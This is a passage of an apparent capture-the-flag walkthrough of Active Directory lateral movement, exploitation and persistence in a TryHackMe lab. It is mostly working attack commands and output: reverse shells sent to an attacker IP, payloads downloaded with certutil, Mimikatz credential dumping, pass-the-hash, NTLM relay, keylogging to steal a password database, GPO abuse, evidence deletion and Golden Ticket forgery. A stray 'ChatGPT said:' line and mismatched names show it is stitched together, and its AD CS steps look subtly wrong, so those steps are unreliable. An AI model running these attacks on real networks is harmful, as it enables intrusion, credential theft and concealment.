
And start a reverse shell on our machine:

```shell
nc -lvnp 4443
```

Which works:

```
listening on [any] 4443 ...
connect to [10.50.65.56] from (UNKNOWN) [10.200.71.249] 63953
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Now using this shell, we need to try to create a service on this machine from `sc_myservice.exe` that we just uploaded:

```cmd
sc.exe \\thmiis.za.tryhackme.com create THMservice-98455 binPath= "%windir%\sc_myservice.exe" start= auto
```

And then start that service:

```cmd
sc.exe \\thmiis.za.tryhackme.com start THMservice-98455
```

And back in `metasploit` console's listener, we received a shell:

```
└─$ msfconsole -qx "use exploit/multi/handler; set lhost 10.50.65.56; set lport 9233; set payload windows/shell/reverse_tcp; run;
dquote> "
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] Using configured payload generic/shell_reverse_tcp
lhost => 10.50.65.56
lport => 9233
payload => windows/shell/reverse_tcp
[*] Started reverse TCP handler on 10.50.65.56:9233
[*] Sending stage (240 bytes) to 10.200.71.201
[*] Command shell session 1 opened (10.50.65.56:9233 -> 10.200.71.201:64297) at 2025-03-08 13:06:29 -0500


Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
-----


C:\Windows\system32>
```

Now let's go to this user's Desktop and run `flag.exe` to retrieve the flag:

```
C:\Windows\system32>cd C:\Users\t1_leonard.summers\Desktop
cd C:\Users\t1_leonard.summers\Desktop

C:\Users\t1_leonard.summers\Desktop>flag.exe
flag.exe
THM{****REDACTED****}
```

WMI provides a powerful interface for performing system management tasks remotely, allowing attackers to execute processes, create services, run scheduled tasks, and even install software. Let’s dive into some of the techniques attackers can exploit through WMI.

Before interacting with WMI, you need to establish a connection using the appropriate protocol (DCOM or Wsman) and credentials.

First we generate our payload with `metasploit`:

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.65.56 LPORT=9233 -f msi > wmi_installer.msi
```
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
```

Then we copy it directly to the `admin$` directory of the SMB share using credentials `t1_corine.water:Korine.1994`:

```shell
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994 
```
```
putting file wmi_installer.msi as \wmi_installer.msi (87.2 kb/s) (average 87.2 kb/s)
```

Now let's go back to our Jump Box:

```shell
ssh za\\t1_corine.waters@10.200.71.249
```

Start `metasploit` exploit handler:

```shell
msfconsole -qx "use exploit/multi/handler; set lhost 10.50.65.56; set lport 9233; set payload windows/x64/shell_reverse_tcp; exploit"
```

Now in our Jump Box, let's change to PowerShell: 

```cmd
powershell -executionpolicy bypass
```

And run the following commands:

```powershell
$username="t1_corine.waters";$password="Korine.1994";$securePassword=ConvertTo-SecureString $password -AsPlainText -Force;$credential=New-Object System.Management.Automation.PSCredential $username,$securePassword;$Opt=New-CimSessionOption -Protocol DCOM;$Session=New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation="C:\Windows\wmi_installer.msi";Options="";AllUsers=$false}
```

And then in our newly spawned shell:

```
C:\Windows\system32>cd C:\Users\t1_corine.waters\Desktop
C:\Users\t1_corine.waters\Desktop>Flag.exe
THM{****REDACTED****}
```

In Windows networks, authentication can occur without direct knowledge of a user’s password due to the way NTLM and Kerberos protocols function. This is exploited using techniques such as Pass-the-Hash (PtH) and Pass-the-Ticket (PtT), which leverage extracted credentials from a compromised host to authenticate as another user. The module explores these attack methods using Mimikatz as the primary credential extraction tool.

NTLM authentication relies on challenge-response mechanisms where the password hash, rather than the plaintext password, is used for verification. Attackers can extract NTLM hashes from a machine’s SAM database (for local users) or from LSASS memory (for both local and domain users). If NTLM authentication is enabled, these hashes can be directly reused for authentication via PtH without cracking them. This attack is executed using Mimikatz by injecting the extracted hash into a new process, effectively impersonating the victim user. Linux tools such as xfreerdp, psexec.py, and evil-winrm also support PtH for remote access.

Kerberos authentication uses encrypted tickets instead of password hashes for access control. A Ticket Granting Ticket (TGT) is issued by the Key Distribution Center (KDC) and can be used to request service-specific Ticket Granting Service (TGS) tickets. If an attacker extracts these tickets from LSASS memory using Mimikatz, they can inject them into their session to impersonate a valid user, a technique known as PtT. This allows access to services without needing the actual password. The klist command can be used to verify injected tickets.

This technique is similar to PtH but applies to Kerberos. Instead of NTLM hashes, attackers use Kerberos encryption keys (RC4, AES128, or AES256) to request a TGT from the KDC. These keys can be extracted from memory using Mimikatz and used to launch a shell as the victim user. If RC4 is enabled, the NTLM hash itself functions as a Kerberos key, allowing for Overpass-the-Hash (OPtH) attacks.

By leveraging these authentication weaknesses, attackers can move laterally across a network, gaining higher privileges and deeper access to sensitive systems. These techniques highlight the risks of stored credentials in memory and the importance of enforcing security measures such as Kerberos-only authentication, disabling NTLM, and regularly clearing credential caches.

Let's get to work:

```shell
ssh za\\t2_felicia.dean@10.200.71.249
```

Let's run `mimikatz` from `C:\tools\mimikatz.exe`:

```cmd
C:\tools\mimikatz.exe
```

Now the following mimikatz commands:

```cmd
# privilege::debug
# token::elevate
# sekurlsa::msv
```

This will give us debug privileges and dump NTLM hashes. Now we will need to navigate a hash for any Domain user. So any user whose Domain is `ZA`. After that copy the NTLM hash and use it in the following way:

```cmd
# token::revert
# sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:bfbd9f1d0398493e7f6288f3ff14e7e9 /run:"C:\tools\nc64.exe -e cmd.exe 10.50.65.56 9233"
```
```
└──╼ $nc -lvnp 9233
listening on [any] 9233 ...
connect to [10.50.65.56] from (UNKNOWN) [10.200.71.249] 56039
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Now that we received the shell, we can use `winrs.exe` to connect to THMIIS as `t1_toby.beck`:

```cmd
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

Now let's retrieve the flag:

```cmd
dir C:\Users\t1_toby.beck\Desktop
C:\Users\t1_toby.beck\Desktop\Flag.exe
```

There's our Flag!

The task involves hijacking an RDP session on the THMJMP2 machine. First, I obtained credentials from the provided URL and used `xfreerdp` to connect to THMJMP2. Once inside, I elevated privileges to SYSTEM using `PsExec64.exe -s cmd.exe`.

Next, I enumerated active user sessions with `query user`, identifying a disconnected session belonging to `t1_toby.beck`. Using the session ID from the output, I executed `tscon <session_id> /dest:<my_session_name>` to hijack the session. Upon successful execution, I gained control of `t1_toby.beck`'s session and retrieved the flag.

First, let's get credentials:

```shell
firefox http://distributor.za.tryhackme.com/creds_t2
```

> Your credentials have been generated: Username: `t2_george.kay` Password: `Jght9206` 

Now let's use `xfreerdp` to connect to this user:

```shell
xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eric.harding /p:Kegq4384 /cert:ignore +clipboard
```

This didn't work well for me, so I opted to complete this task on a Windows VM using `mstsc.exe`. 

- Open `mstsc.exe`
- Enter `thmjmp2.za.tryhackme.com`
- Log in with the credentials. (I used `ZA\t2_george.kay` as username to get it to work)

Once inside THMJMP2, open Command Prompt as Administrator: press `Win + R`, type `cmd`, and hit `Ctrl + Shift + Enter` (Or maybe just look for `cmd` in start menu, right click and "Run as administrator").

If not, then run the following:

```cmd
cd C:\tools
PsExec64.exe -s cmd.exe
```

Now identify RDP sessions:

```cmd
query user
```

This should list active RDP sessions. One of which should be: `t1_toby.beck`. All we have to do now is use command to hijack it:

```cmd
tscon 3 /dest:rdp-tcp#6
```

In this case the session to be hijacked has an ID of `3` and we are writing destionation of our own session in `/dest:`. And that's it we got the flag.

In restricted network environments, attackers often face blocked ports and segmentation that prevent direct access to critical services like SMB, RDP, WinRM, and RPC. To bypass these restrictions, attackers can use port forwarding techniques, turning a compromised machine into a pivot point to reach otherwise inaccessible hosts.

First we'll have to retrieve credentials from `distributor.za.tryhackme.com/creds`:

> Your credentials have been generated: Username: `damien.horton` Password: `pABqHYKsG8L7`

Let's log in now: 

```shell
ssh za\\damien.horton@10.200.71.249
```

Now that we're in, let's visit socat:

```cmd
cd C:\tools\socat
```

And start port forwarding with it: 

```
socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
```

Now on the host machine connect to it via RDP:

```shell
xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

Once in, retrieve the flag from `t1_thomas.moore`'s Desktop.

The THMDC server runs a vulnerable web server (Rejetto HFS) on port 80. Firewall rules prevent direct access to THMDC and outbound connections from THMDC to the attacker’s machine.The exploit requires multiple port forwards.

THMJMP2 can reach THMDC’s port 80, but the attacker cannot. We set up remote port forwarding to make port 80 available to the attacker:

```cmd
ssh tunneluser@1.1.1.1 -R 8080:THMDC.za.tryhackme.com:80 -N
```

Let's verify access on attacking linux machine:

```
curl http://127.0.0.1:8080
```

If this request succeeds we have proxied THMDC’s web server through THMJMP2

The exploit requires a web server to serve the payload. Since THMDC blocks outbound connections, we host the web server on THMJMP2 instead. On THMJMP2, start a simple web server:

```cmd
python -m http.server 8000
```

Modify the exploit's options in `metasploit`:

```shell
msfconsole -qx "use exploit/windows/http/rejetto_hfs_exec; set RPORT 8080; set SRVPORT 8000; set LHOST 127.0.0.1; set LPORT 9001"
```

Now set up a listener on the linux machine:

```
nc -lvnp 9001
```

And run the exploit. See flag at `C:\hfs`!

## Exploiting Active Directory

Assuming we have connected to the network properly, let's get the credentials:

```
firefox distributor.za.tryhackme.loc/creds
```

> Your credentials have been generated: Username: justin.barnes Password: O8SMjhmo 

And connect to the work box:

```
ssh za.tryhackme.loc\\justin.barnes@thmwrk1.za.tryhackme.loc
```

Active Directory (AD) supports Permission Delegation, allowing administrators to delegate specific rights to users or groups. While this helps manage large organizations efficiently, misconfigurations can lead to security vulnerabilities. One such vulnerability involves Access Control Entries (ACEs) within Discretionary Access Control Lists (DACLs), enabling attackers to escalate privileges.

Let's start the `neo4j` console first:

```
sudo neo4j start
```

Make note of the localhost address it is assigned to. Then go to that address:

```
firefox localhost:7474
```

Login with default credentials `neo4j:neo4j` and change the password. Make sure to choose `bolt://` schema. 

Then run bloodhound and log in with new password:

```
bloodhound --no-sandbox
```

Once `bloodhound` is running, click __Upload Data__ and locate the zip file from the task. Search for your user (`justin.barnes` in this case) and set it as a __Starting node__. Then search for _Tier 2 Admins_ and set it as an __Ending node__.

Since Domain Users have the AddMembers ACE on IT Support, we can join the group. On THMWRK1:

```powershell
Add-ADGroupMember "IT Support" -Members "justin.barnes"
```

Now verify the changes:

```powershell
Get-ADGroupMember -Identity "IT Support"
```

Your user should be there. Now, find an admin account to target:

```powershell
Get-ADGroupMember -Identity "Tier 2 Admins"
```

I choose `t2_melanie.davies`. Let's reset her password (as a member of __IT Support__ we can reset passwords of Tier 2 Admins):

```powershell
gpupdate /force
$Password = ConvertTo-SecureString "strong.pass1" -AsPlainText -Force
Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password
```

Now exit the shell and ssh back in as `t2_melanie.davies`:

```
ssh za.tryhackme.loc\\t2_melanie.davies@thmwrk1.za.tryhackme.loc
```

Locate the flag:

```
cd C:\Users\Administrator\Desktop
type flag1.txt
```

Kerberos Delegation is a feature that allows applications, like a web server, to access resources hosted on another server on behalf of a user without directly giving the application access. This enables more secure and efficient access management, especially when dealing with services like SQL databases or web applications. There are three types of Kerberos Delegation: Unconstrained, Constrained, and Resource-Based Constrained Delegation (RBCD). Unconstrained Delegation, being the least secure, allows any service to impersonate a user without restrictions, while Constrained Delegation limits delegation to specific services. RBCD, introduced in 2012, further refines delegation by allowing the service to specify which accounts are allowed to delegate to it, enhancing security.

Exploiting Constrained Delegation involves compromising an account with delegation rights and using tools like PowerView to enumerate delegations. Once an account with delegation rights (e.g., `svcIIS`) is obtained, a TGT (Ticket Granting Ticket) is generated for it, which can then be used to forge service tickets (TGS) for specific services, such as HTTP or WSMAN, using tools like Kekeo. These tickets can then be imported into memory with Mimikatz, allowing the attacker to impersonate a higher-privileged user. With the forged tickets, the attacker can establish a PowerShell session on a remote server (e.g., `THMSERVER1`), gaining access to sensitive resources as the impersonated user.

We will exploit Constrained Delegation for this task. The first thing we need to do is enumerate available delegations. Let's use our new privileged user for the network couple of commands. We can use the Get-NetUser cmdlet of PowerSploit for this enumeration by running the following command:

```powershell
Import-Module C:\Tools\PowerView.ps1
Get-NetUser -TrustedToAuth
```

Based on the output of this command, we can see that the svcIIS account can delegate the HTTP and WSMAN services on THMSERVER1. Once you've identified an account with delegation rights, the next step is to dump the credentials of the delegated account. To do this, you need to escalate privileges on the system and dump credentials from the Local Security Authority (LSA). 

```powershell
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

```
token::elevate
lsadump::secrets
```

Once you have the credentials for svcIIS, you now have the necessary information to impersonate it. If it's an NTLM hash, you can use it for pass-the-hash attacks. If it's a plaintext password, you can use it directly to authenticate as svcIIS:

```
token::revert
```
```powershell
C:\Tools\kekeo\x64\kekeo.exe
```
```
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
```

Once you have the TGT for svcIIS, you can request TGS for specific services. For example, you know that svcIIS can delegate to the HTTP and WSMAN services on THMSERVER1.

```
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc
exit
```

Now that we have the two TGS tickets, we can use Mimikatz to import them:

```
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

With the tickets now injected into your session, you can authenticate as t1_trevor.jones and interact with the target system (e.g., THMSERVER1) using services like PowerShell Remoting:

```powershell
New-PSSession -ComputerName thmserver1.za.tryhackme.loc
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

Get the flag:

```
cd C:\Users\Administrator\Desktop
type flag2.txt
```

This attack forces a machine account to authenticate to an attacker's SMB server by abusing the Print Spooler service ("Printer Bug"). The relayed authentication allows privileged access to another machine. We use BloodHound to identify machine accounts with admin privileges over others, verify Print Spooler and SMB signing conditions, then use SpoolSample.exe and Impacket's ntlmrelayx.py to exploit the relay.

First we need to identify machines with Admin privileges over others. We need to use `bloodhound` to check which machine accounts have administrative access over other machines. 
Open `bloodhound`:

```shell
sudo neo4j start
bloodhound --no-sandbox
```

Click __Create custom query__ under the _Analysis_ tab. Run the following __Cypher Query__ to find machines with `AdminTo` relationships:

```sql
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```

The query shows that there is a `SERVER MANAGEMENT@ZA.TRYHACKME.LOC` group, which has admin privileges over _`THMSERVER1`_ and a member of which is _`THMSERVER2`_. Let's connect to `THMWRK1`:

```shell
ssh za.tryhackme.loc\\justin.barnes@thmwrk1.za.tryhackme.loc
```

Once there we check if THMSERVER2 has the Print Spooler service running, as it is required for coercing authentication.

```powershell
GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
```

The output looks like this:

```
Location      :
Name          : Microsoft XPS Document Writer
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2

Location      :
Name          : Microsoft Print to PDF
PrinterState  : 0
PrinterStatus : 3
ShareName     :
SystemName    : THMSERVER2
```

This means __Print Spooler__ is running. Now from our __attacking machine__ we need to determine if SMB signing is unenforced for the _NTLM_ relay to work: 

```shell
nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
```

The output should look like this:

```
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

This means that SMB signing is allowed but __not enforced__ which makes the system vulnerable. 

Now we need to set up an NTLM relay attack. First let's find a script called `ntlmrelayx.py` on our attacking machine:

```shell
sudo updatedb
locate ntlmrelayx.py
/usr/share/doc/python3-impacket/examples/ntlmrelayx.py
```

Now let's set up this script to capture and relay NTLM authentication attempts:

```shell
python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://"10.200.47.201" -debug
```

Our relay server is now waiting for authentication attempts. Now, we force THMSERVER2 to authenticate to our malicious SMB server. From an SSH session on THMWRK1, run SpoolSample.exe to trigger authentication:

```powershell
C:\tools\SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.50.45.173"
```

This command should dump the hashes for various users on this server:

```
...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[+] Calculating HashedBootKey from SAM
[+] NewStyle hashes is: True
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
[+] NewStyle hashes is: True
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
[+] NewStyle hashes is: True
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
[*] Done dumping SAM hashes for host: 10.200.47.201
...
```

Now let's test a command execution. On attacking machine run:

```shell
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.47.201 -c 'whoami' -debug
```

And on the SSH session to THMWRK1, run:

```powershell
C:\tools\SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.50.45.173"
```

The result on the attacking machine should be:

```
[*] Executed specified command on host: 10.200.47.201
nt authority\system
```

Which means we can now get the flag:

```shell
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.47.201 -c 'type C:\Users\Administrator.ZA\Desktop\flag3.txt' -debug
```

Get the flag!

In this attack, we will focus on targeting Active Directory users to extract stored credentials and gain deeper access to the network. Since we already have administrative control over multiple workstations and servers, our next step will be to search for valuable user data. We will begin by conducting enumeration within user directories, looking for files that might contain stored passwords. During this process, we may discover a KeePass database file, which is likely encrypted with a strong password. Instead of attempting to crack the database, which could be time-consuming and ineffective, we will shift our focus to capturing the credentials as the user types them.

To achieve this, we will leverage Meterpreter’s keylogging capabilities. However, since our shell is running with SYSTEM privileges, we must first migrate to a process owned by the target user. By identifying an active explorer.exe process under the user’s session and migrating to it, we will ensure that we are in the correct context to capture keystrokes. Once the migration is complete, we will start the keylogger and wait for the user to interact with KeePass. After a period of observation, we will extract the recorded keystrokes, potentially revealing the master password for the database.

Once we obtain the password, we will use it to unlock the KeePass database and retrieve stored credentials. This step could grant us access to additional privileged accounts, expanding our control over the environment. To maintain long-term access, we will create a new administrative user on the compromised system, ensuring that we can reconnect even if our current session is terminated. By enabling remote access mechanisms such as RDP, we will establish persistence for future operations. This approach will allow us to systematically escalate our privileges while maintaining stealth and control over the target network.

We will be using our WinRM session with `t1` admin access for this. Let's create a payload first:

```shell
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.50.45.173 LPORT=9233 -f psh -o shell.ps1
```

And start a listener:

```shell
msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 10.50.45.173; set LPORT 9233; run"
```

Also start a `python` server:

```shell
python3 -m http.server 8088
```

Now download the payload to the `t1` WinRM session:

```powershell
certutil.exe -urlcache -split -f http://10.50.45.173:8088/shell.ps1
```

And run it:

```powershell
.\shell.ps1
```

A meterpreter shell should spawn in the listener. 

Find out the PID of `explorer.exe`:

```meterpreter
ps | grep "explorer"
```

Migrate to it:

```meterpreter
migrate 3636
```

Start a keystroke sniffer:

```meterpreter
keyscan_start
```

Dump the keystrokes:

```meterpreter
keyscan_dump
```

Stop the keystroke sniffer:

```meterpreter
keyscan_stop
```

This should reveal the password for the `kdbx` database.

Let's look for a `*.kdbx` file:

```meterpreter
search -f *.kdbx
```

Download any of these that is 1886 bytes in size:

```meterpreter
download c:/users/t1_trevor.jones/'My Documents'/PasswordDatabase.kdbx
```

Install keepass client:

```shell
sudo apt install kpcli
```

Run it:

```shell
kpcli
```

Now execute the following command sequence to get the flag and the password:

```kpcli
open PasswordDataase.kdbx
show -f -a PasswordDatabase/General/Flag
```

There's your flag!

```kpcli
show -f -a PasswordDatabase/General/svcServMan
```

And there's the password.

In the upcoming exploitation process, keylogging will allow us to decrypt a credential database, providing access to the svcServMan account. Before leveraging these credentials, enumeration using BloodHound will help determine their privileges. Notably, this account has ownership over a Group Policy Object (GPO) applied to THMSERVER2, presenting an opportunity for further Active Directory exploitation.

Since GPOs dictate system configurations across domain-joined machines, modifying them can grant elevated privileges. By exploiting this, we will add an account we control to both the local Administrators and Remote Desktop Users groups on THMSERVER2, ensuring administrative access and enabling RDP. Instead of directly logging into THMSERVER1, which may disrupt an active user session, we will RDP into THMWRK1 and inject the AD user's credentials using the `runas` command. This will allow access to Group Policy Management (GPM) via the Microsoft Management Console (MMC).

Once inside GPM, we will locate the relevant GPO, edit its security settings, and create or modify the IT Support group. By adding this group to the Administrators and Remote Desktop Users groups, our controlled account will gain the necessary permissions. After applying these changes, the GPO will take effect within 15 minutes, granting us administrative control over THMSERVER2.

First enumerate Privileges with BloodHound. Load collected data into BloodHound and search for svcServMan. And then identify that the account has ownership over a Group Policy Object (GPO) applied to THMSERVER2.

Now let's RDP into `thmwrk1`:

```shell
xfreerdp /v:thmwrk1.za.tryhackme.loc /u:justin.barnes /p:'O8SMjhmo'
```

And at the prompt, fill in the password from the end of the previous task. 

Use the runas command to impersonate the svcServMan user: 

```cmd
runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe
```

Open up `mmc.exe`:

```cmd
mmc.exe
```

In the MMC window, go to __File__ → __Add/Remove Snap-in__ and then select __Group Policy Management__ → Click __Add__ → Click __OK__.

In Group Policy Management, navigate to __Servers → Management Servers → Management Server Pushes__ and Right-click the GPO and select __Edit__.

Modify Restricted Groups to Add an Admin Account: __Expand Computer Configuration → Policies → Windows Settings → Security Settings__. Right-click __Restricted Groups → Add Group__. If _IT Support_ already exists, inspect it. Otherwise click __Browse__, type _IT Support_, and click __Check Names__. Click __OK__ twice.

In the IT Support properties, add __Administrators__ and __Remote Desktop Users__. Click __Apply__ and __OK__.

Force immediate policy update on `THMSERVER2`:

```cmd
gpupdate /force
```

RDP into THMSERVER2 using the account added to IT Support. Get the flag at Administrator desktop!

Active Directory Certificate Services (AD CS) is Microsoft's Public Key Infrastructure (PKI) implementation, commonly used for authentication and secure communication. When misconfigured, AD CS can be exploited for privilege escalation and lateral movement within a network. One common attack vector involves vulnerable certificate templates that allow low-privileged users to request certificates with elevated permissions.

By enumerating available certificate templates, attackers can identify those that permit client authentication and enrollment under insecure conditions. If a template allows a user to request a certificate that can be used for authentication without proper constraints, an attacker can obtain a certificate for a high-privilege account, such as a domain administrator. This certificate can then be used to generate a valid Kerberos Ticket Granting Ticket (TGT) or perform pass-the-cert attacks to authenticate as the targeted user.

Another attack involves Enterprise Certificate Authority misconfigurations where low-privileged users can enroll for certificates using a vulnerable template. These templates may grant access to services that allow authentication via certificates, enabling an attacker to impersonate privileged users. AD CS attacks often bypass traditional credential-based authentication protections since they leverage the trust model of certificate-based authentication rather than stolen passwords or hashes.

Once an attacker has obtained a valid certificate for a privileged account, they can authenticate to Active Directory services without triggering password-based security mechanisms. This access can be used to further compromise the environment, maintain persistence, or escalate privileges within the domain. Properly securing AD CS requires restricting template permissions, enforcing strong enrollment policies, and monitoring certificate-related authentication attempts.

On a domain-joined machine, use `certutil` to check if CA exists:

```powershell
certutil -config - -ping
```

If a CA is available, it will respond, confirming that AD CS is running.

Certificate templates define how certificates are issued and what permissions users have. Some templates may allow enrollment by unprivileged users or permit Subject Alternative Name (SAN) modification, leading to privilege escalation.

List Certificate Templates:

```powershell
certutil -TCA <CA-Name>
```

Look for templates with Client Authentication enabled and misconfigured permissions.

Request a certificate for a privileged user. If a vulnerable template is found, the next step is to request a certificate. Using `certreq`, create a request file (`request.inf`): 

```
[Version]
Signature="$Windows NT$"

[NewRequest]
Subject = "CN=Administrator,OU=Domain Admins,DC=domain,DC=local"
HashAlgorithm = sha256
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
RequestType = PKCS10

[Extensions]
2.5.29.17 = "{text}dns=Administrator"
```

Submit the request:

```powershell
certreq -submit -config "<CA-Name>" request.inf
```

Once a certificate for a privileged user is obtained, use it to authenticate.

Convert to `.pfx` format:

```bash
openssl pkcs12 -export -inkey key.pem -in cert.pem -out cert.pfx
```

Authenticate using Rubeus for pass-the-cert attack:

```powershell
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:
```

With the Kerberos TGT in memory, use it to gain access to privileged systems:

```powershell
Rubeus.exe ptt /ticket:TGT.kirbi
```

Now, run privileged commands:

```powershell
whoami /groups
```

Use Evil-WinRM to access a Domain Controller:

```bash
evil-winrm -i 10.200.47.101 -u Administrator -H <NTLM-Hash>
```

Use PsExec to execute commands remotely:

```powershell
C:\tools\psexec64.exe \\10.200.47.201 -s cmd.exe
```

After privilege escalation, remove evidence of certificate requests:

```powershell
certutil -deleterow <Request-ID>
```

Persist with Golden Certificates:

```powershell
Rubeus.exe tgtdeleg /user:Administrator /ticket:cert.pfx
```

ChatGPT said:

Domain trusts in Active Directory allow users to access resources across different domains within a forest. In this scenario, we initially compromised the ZA.TRYHACKME.LOC domain but aimed to take control of the entire TRYHACKME.LOC forest by exploiting domain trust relationships. Trusts between a parent domain (TRYHACKME.LOC) and child domains (ZA.TRYHACKME.LOC, UK.TRYHACKME.LOC) are bidirectional and transitive, meaning a compromise in one child domain can be escalated to the parent domain.

The KRBTGT account, responsible for handling Kerberos authentication, is crucial in this process. If an attacker gains the KRBTGT password hash from a compromised child domain, they can create a Golden Ticket, forging their own Kerberos Ticket Granting Tickets (TGTs) to authenticate as any user. Using Mimikatz, we dumped the KRBTGT password hash from the ZA domain controller (THMSERVER2). With this, we could forge a Golden Ticket, granting unrestricted access to the compromised domain.

To escalate further, we leveraged Inter-Realm TGTs, which allow authentication between different domains in a trust relationship. By forging a TGT and adding an extra SID corresponding to the Enterprise Admins group of the parent domain, we effectively gained administrative control over the entire forest. After retrieving the necessary SIDs (the child domain controller's SID and the Enterprise Admins group's SID from the parent domain), we used Mimikatz to generate the Golden Ticket. Once the ticket was injected, we verified access to both the child and parent domain controllers, confirming complete control over the forest.

You must have administrative privileges on the ZA.TRYHACKME.LOC domain controller (THMSERVER2). Use a privileged shell (Command Prompt or PowerShell as Administrator).

Dump the KRBTGT password hash using Mimikatz:

```powershell
C:\tools\mimikatz64.exe
```

Enable debug privileges:

```
privilege::debug
```

Use DCSync to extract the KRBTGT hash:

```
lsadump::dcsync /user:za\krbtgt
```

Note down the extracted NTLM hash.

Retrieve the SID of the child domain controller (THMDC):

```powershell
Get-ADComputer -Identity "THMDC"
```

Note down the SID from the output.

Retrieve the SID of the Enterprise Admins group in the parent domain:

```powershell
Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
```

Note down the retrieved SID.

Generate a forged Golden Ticket with Mimikatz. Run the following command to generate and inject the Golden Ticket:

```
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<child domain SID> /service:krbtgt /rc4:<KRBTGT hash> /sids:<Enterprise Admins SID> /ptt
```

Check if the Golden Ticket was injected successfully:

```powershell
klist
```

If successful, you should see a valid Kerberos ticket.

Access the parent domain controller (THMROOTDC). Open a privileged Command Prompt and execute: 

```cmd
dir \\thmrootdc.tryhackme.loc\c$
```

If access is granted, you have successfully escalated to the parent domain.

Use Mimikatz to verify Domain Admin or Enterprise Admin group membership:

```
token::whoami
```

If Enterprise Admins is listed, you have gained full control over TRYHACKME.LOC

## Persisting Active Directory

Active Directory (AD) persistence is a crucial phase in maintaining long-term access after compromising a network. Once an attacker gains high privileges, the next step is ensuring continued access even if the compromised credentials are reset. This module explores various persistence techniques, starting with credential-based persistence, focusing on DC Sync attacks.

In an enterprise environment, multiple domain controllers (DCs) ensure authentication services across different locations. To maintain synchronization, domain controllers use a process called DC Synchronization (DC Sync), allowing them to replicate account information, including password hashes. However, certain privileged accounts—such as those in the Domain Admins or Enterprise Admins groups—also have replication permissions. If an attacker compromises such an account, they can abuse DC Sync to extract password hashes for any user, including the krbtgt account, enabling Golden Ticket attacks.

